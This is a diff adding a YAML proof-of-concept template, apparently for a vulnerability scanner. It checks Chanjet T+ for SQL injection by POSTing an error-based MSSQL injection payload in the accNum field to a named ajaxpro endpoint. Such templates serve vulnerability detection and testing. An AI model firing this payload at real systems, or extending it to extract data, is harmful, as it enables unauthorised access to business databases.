@@ -1,0 +1,19 @@
+id: poc-yaml-cjt-T+-sql-Injection
+info:
+  name: 畅捷通T+ SQL注入漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 畅捷通T+
+requests:
+- method: POST
+  path: /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex
+  data: '{"accNum": "3'' AND 5227 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)+(SELECT
+    (CASE WHEN (5227=5227) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(120)+CHAR(113)))--
+    NCab", "functionTag": "SYS0104", "url": ""}
+
+    '
+  expression: status_code == 200 && contains(body,"\"value\":\"245 数据库错误") && contains(body,"varchar")
+    && contains(body,"int")
+variables: {}
+transport: http
